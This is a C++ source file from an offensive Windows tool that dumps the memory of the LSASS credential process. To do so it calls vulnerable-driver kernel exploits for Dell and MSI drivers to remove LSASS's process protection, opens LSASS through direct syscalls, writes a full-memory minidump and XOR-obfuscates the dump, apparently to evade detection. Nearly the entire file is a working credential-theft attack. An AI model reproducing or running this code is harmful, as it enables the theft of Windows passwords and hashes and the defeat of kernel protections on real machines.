#include "lsass_advanced.h"
#include "bypass.h"
#include "defense.h"
#include "driver_byovd.h"
#include <cstdio>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")

static bool g_kernelAccessEstablished = false;

DWORD GetLsassPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    
    CloseHandle(snap);
    return pid;
}

bool RemovePPLViaKernel() {
    printf("[*] Attempting to remove PPL from LSASS via kernel exploit\n");
    
    if (!g_kernelAccessEstablished) {
        if (ExploitDellDBUtil_2_3()) {
            g_kernelAccessEstablished = true;
            printf("[+] Kernel access via Dell driver established\n");
        }
        else if (ExploitMSIRTCore64()) {
            g_kernelAccessEstablished = true;
            printf("[+] Kernel access via MSI driver established\n");
        }
        else {
            printf("[-] Failed to establish kernel access\n");
            return false;
        }
    }
    
    return RemovePPLFromLSASS();
}

bool DumpLsassViaMiniDumpSyscall(DWORD pid, const char* outPath) {
    printf("[*] Attempting to dump LSASS (PID: %d) to %s\n", pid, outPath);
    
    HANDLE hLsass = SysOpenProcess(pid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
    
    if (!hLsass) {
        printf("[*] Cannot open LSASS directly, trying to remove PPL...\n");
        
        if (RemovePPLViaKernel()) {
            printf("[+] PPL removed, retrying to open LSASS...\n");
            hLsass = SysOpenProcess(pid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
        }
        
        if (!hLsass) {
            printf("[*] Trying with PROCESS_ALL_ACCESS...\n");
            hLsass = SysOpenProcess(pid, PROCESS_ALL_ACCESS);
        }
    }
    
    if (!hLsass) {
        printf("[-] Cannot open LSASS process even after PPL removal\n");
        return false;
    }
    
    printf("[+] LSASS opened successfully\n");
    
    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, 
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot create dump file: %s\n", outPath);
        CloseHandle(hLsass);
        return false;
    }
    
    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(MiniDumpWithFullMemory | 
        MiniDumpWithFullMemoryInfo | MiniDumpWithHandleData | 
        MiniDumpWithUnloadedModules);
    
    BOOL dumped = MiniDumpWriteDump(hLsass, pid, hFile, 
        dumpType, NULL, NULL, NULL);
    
    CloseHandle(hFile);
    CloseHandle(hLsass);
    
    if (dumped) {
        printf("[+] LSASS dumped successfully to %s\n", outPath);
        
        HANDLE f = CreateFileA(outPath, GENERIC_READ | GENERIC_WRITE, 
            0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            BYTE buf[4096];
            DWORD read, written;
            while (ReadFile(f, buf, sizeof(buf), &read, NULL) && read > 0) {
                for (DWORD i = 0; i < read; i++) buf[i] ^= 0xAA;
                SetFilePointer(f, -static_cast<LONG>(read), NULL, FILE_CURRENT);
                WriteFile(f, buf, read, &written, NULL);
            }
            CloseHandle(f);
            printf("[+] Dump obfuscated with XOR 0xAA\n");
        }
        
        return true;
    }
    
    printf("[-] MiniDumpWriteDump failed. Last error: %d\n", GetLastError());
    return false;
}